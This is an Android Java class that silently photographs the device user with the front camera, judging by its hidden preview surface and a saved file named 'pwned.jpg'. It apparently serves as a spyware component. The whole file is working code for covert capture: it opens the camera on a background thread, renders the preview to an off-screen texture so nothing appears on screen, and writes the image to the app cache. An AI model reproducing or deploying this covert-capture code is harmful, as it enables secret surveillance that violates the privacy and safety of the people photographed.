import java.io.File;
import java.io.FileOutputStream;

public final class CameraSnap {

    public interface Cb {
        void onDone(File f);
    }

    private static final Handler UI = new Handler(Looper.getMainLooper());

    public static void snap(final Context c, final Cb cb) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                boolean granted = Build.VERSION.SDK_INT < 23
                        || c.checkSelfPermission(android.Manifest.permission.CAMERA)
                        == PackageManager.PERMISSION_GRANTED;
                if (!granted) {
                    done(cb, null);
                    return;
                }

                Camera cam = null;
                File out = new File(c.getCacheDir(), "pwned.jpg");
                try {
                    cam = Camera.open(findFront());
                    cam.setPreviewTexture(new SurfaceTexture(10));
                    cam.startPreview();
                    final File f = out;
                    cam.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            try {
                                FileOutputStream fos = new FileOutputStream(f);
                                fos.write(data);
                                fos.close();
                            } catch (Exception ignored) {
                            }
                            try {
                                camera.release();
                            } catch (Exception ignored) {
                            }
                            done(cb, f);
                        }
                    });
                } catch (Exception e) {
                    if (cam != null) {
                        try {
                            cam.release();
                        } catch (Exception ignored) {
                        }
                    }
                    done(cb, null);
                }
            }
        }).start();
    }

    private static void done(final Cb cb, final File f) {
        UI.post(new Runnable() {
            @Override
            public void run() {
                cb.onDone(f);
            }
        });
    }

    private static int findFront() {
        int n = Camera.getNumberOfCameras();
        Camera.CameraInfo info = new Camera.CameraInfo();
        for (int i = 0; i < n; i++) {
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
        }
        return 0;
    }
}
